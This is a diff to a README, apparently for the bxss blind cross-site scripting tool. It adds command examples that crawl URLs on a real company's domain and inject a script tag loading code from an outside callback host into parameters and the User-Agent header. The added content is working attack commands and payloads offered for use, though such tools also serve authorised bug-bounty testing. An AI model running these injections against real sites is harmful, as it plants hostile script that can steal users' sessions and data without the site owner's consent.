@@ -76,7 +76,26 @@ go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
 subfinder -d uber.com \
 | gau \
 | grep "&" \
+| bxss -p '><script src=https://xss.report/c/username></script>' \
+-t
+```
+
+### Append To Parameters
+```bash
+subfinder -d uber.com \
+| gau \
+| grep "&" \
 | bxss -a -p '><script src=https://xss.report/c/username></script>' \
+-t
+```
+
+### Both Headers & Parameters
+```bash
+subfinder -d uber.com \
+| gau \
+| grep "&" \
+| bxss -p '><script src=https://xss.report/c/username></script>' \
+-H "User-Agent" \
 -t
 ```
 
